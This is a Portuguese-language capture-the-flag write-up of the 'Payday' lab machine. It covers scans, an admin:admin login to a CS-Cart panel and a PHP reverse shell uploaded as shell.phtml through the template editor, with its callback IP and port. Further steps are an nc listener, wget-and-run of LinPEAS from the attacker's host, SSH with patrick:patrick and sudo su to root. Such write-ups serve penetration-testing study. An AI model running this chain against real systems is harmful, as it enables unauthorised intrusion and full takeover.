A Payday foi uma boa lembrança de que o básico precisa entrar na metodologia. Comecei por uma loja CS-Cart, consegui acesso ao painel com admin:admin e usei o editor de templates para chegar a uma shell. Depois, uma senha igual ao nome do usuário e as permissões de sudo fecharam o caminho até root.

1 · Reconhecimento

Começo pelo Nmap para descobrir os serviços da Payday. O -A reúne identificação de versões, scripts padrão, estimativas de sistema e traceroute. Salvo a saída em nmap.txt para consultar depois.

sudo nmap -T4 -A 192.168.107.39 -oN nmap.txt

Também verifico as mil portas UDP mais comuns. O comando abaixo está em uma única linha. Como uso poucas tentativas e uma taxa mínima alta, trato o resultado como triagem: ausência de resposta não confirma que uma porta está fechada.

sudo nmap -sU -sV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 192.168.107.39 -Pn

2 · Portas e aplicação web

Há vários serviços antigos, mas o HTTP já entrega uma pista direta: uma loja feita com CS-Cart. Organizo o resultado e sigo pela aplicação web.

A resposta NetBIOS faz o scan UDP sugerir Windows, mas isso não define o sistema operacional. Samba também oferece esses serviços em Linux. A shell obtida depois confirma que a Payday é Linux.

3 · Enumeração e painel administrativo

Testo admin:admin no login da loja e consigo entrar. Isso confirma uma credencial fraca, mas ainda preciso entender o alcance desse acesso. Continuo enumerando os caminhos da aplicação.

dirsearch -u http://192.168.107.39/

O painel que aparece nas capturas está em /admin.php. Faço login novamente com admin:admin. Agora estou na área administrativa, com acesso ao editor de templates. O próprio painel avisa que a senha não deveria ser igual ao nome do usuário.

http://192.168.107.39/admin.php

4 · Do upload à execução de código

Minha primeira tentativa de upload não funcionou. Em vez de insistir sem entender, pesquiso o CS-Cart e encontro uma referência para execução remota de código autenticada. O detalhe era a extensão .phtml: nessa configuração do servidor, ela também é interpretada como PHP.

A referência reúne mais de uma falha, mas o caminho registrado nas minhas capturas é o upload de shell.phtml, seguido de uma requisição ao arquivo. É esse fluxo que descrevo aqui. A referência do exploit foi testada no CS-Cart 1.3.3; o título, sozinho, não confirma a versão instalada no alvo.

Para preparar o arquivo, uso uma reverse shell PHP e ajusto o endereço de retorno para o IP da minha VPN, 192.168.45.167, com a porta 443. A referência aponta para a shell PHP do pentestmonkey. Abaixo estão os campos que precisam corresponder ao listener, sem reproduzir o script inteiro.

$ip = '192.168.45.167';
$port = 443;
  1. Salvo a shell PHP com o nome shell.phtml.
  2. No painel, abro Look and Feel → Template editor.
  3. Entro no diretório de templates desejado e envio o arquivo pela opção de upload.
  4. Anoto o caminho em que ele foi salvo. Na minha sessão: /skins/default_blue/admin/auth_pages/.

O nome da extensão não é suficiente para executar código em qualquer servidor. Aqui funciona porque o upload aceita o arquivo e o servidor processa .phtml como PHP quando o caminho é acessado.

5 · Reverse shell e flag local

Deixo o listener pronto no Kali antes de acessar a shell. Uso sudo porque a porta 443 exige privilégio para escuta na configuração do meu ambiente.

sudo nc -nlvp 443

No navegador, abro o arquivo no caminho em que ele realmente foi enviado. Apenas fazer upload não basta: a requisição é o que aciona a execução do PHP.

http://192.168.107.39/skins/default_blue/admin/auth_pages/shell.phtml

BOOOM, estou dentro como www-data. Uso o interpretador python disponível no alvo para abrir uma pseudo-terminal. Isso melhora a interação com a shell; não significa que todos os ajustes de terminal já estejam feitos.

python -c 'import pty; pty.spawn("/bin/bash")'

Vou até /home/patrick e consigo ler local.txt. Repare no prompt e no whoami: continuo como www-data. Estar na home de patrick não significa que já virei esse usuário.

whoami
hostname
cd /home/patrick
cat local.txt

O ifconfig sem caminho não é encontrado porque /sbin não está no PATH dessa sessão. A própria mensagem aponta a localização do programa. Para chamá-lo diretamente, o caminho é /sbin/ifconfig.

6 · Enumeração local

Passo para /tmp, transfiro o LinPEAS do servidor HTTP no meu Kali e tento executar. O diretório facilita trabalhar com arquivos temporários; isso não concede privilégios extras.

cd /tmp
wget http://192.168.45.167/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Tive problemas com o LinPEAS nessa máquina. Meu registro não traz a causa, então não dá para atribuir a falha a uma dependência específica. O próximo passo foi voltar ao básico: investigar o usuário patrick e testar uma hipótese simples de credencial no laboratório.

7 · SSH como patrick

O usuário era patrick. Testo a senha patrick no SSH e consigo autenticar. Sério… depois do admin:admin, eu devia ter considerado essa possibilidade mais cedo, auehuaheu. Fica o aprendizado para a metodologia.

Por ser um servidor antigo, a conexão registrada usa opções de compatibilidade com ssh-rsa. Elas ficam restritas a esse comando para o host do lab. HostKeyAlgorithms trata da autenticação do servidor; PubkeyAcceptedAlgorithms trata da autenticação por chave do cliente e não é o que valida a senha patrick.

ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa patrick@192.168.107.39

Quando o SSH pede a senha, informo patrick. Depois confiro a identidade com whoami. Agora tenho uma sessão como patrick, diferente da reverse shell anterior.

8 · Permissões de sudo e root

Com a nova sessão, verifico as permissões de sudo. A entrada (ALL) ALL permite que patrick execute qualquer comando como outro usuário, incluindo root. O sudo pede a senha do patrick, que agora conheço.

sudo -l

Na captura, primeiro tento su root e recebo uma falha de autenticação. Esse comando pede a senha do root. Em seguida uso sudo su, que aproveita a autorização do patrick no sudo para abrir uma shell privilegiada. São formas de autenticação diferentes.

sudo su
whoami
cd /root
ls
cat proof.txt
hostname

O whoami retorna root, o hostname continua sendo payday e consigo ler a prova em /root/proof.txt. Pwn3d!

9 · O que levo dessa máquina

A Payday seguiu por CS-Cart → admin:admin → upload de .phtml → www-data → patrick:patrick → sudo → root. O acesso final veio de credenciais fracas e permissões amplas. Eu estava procurando uma complicação e precisava olhar melhor para o básico.

  • Separar os acessos: login na loja, painel administrativo, www-data e patrick têm contextos diferentes.
  • Entender o upload: extensão aceita, diretório de destino e processamento pelo servidor fazem parte da mesma cadeia.
  • Voltar à enumeração manual: uma ferramenta falhar não encerra a investigação.
  • Revisar sudo a cada novo usuário: a permissão relevante apareceu na sessão do patrick.
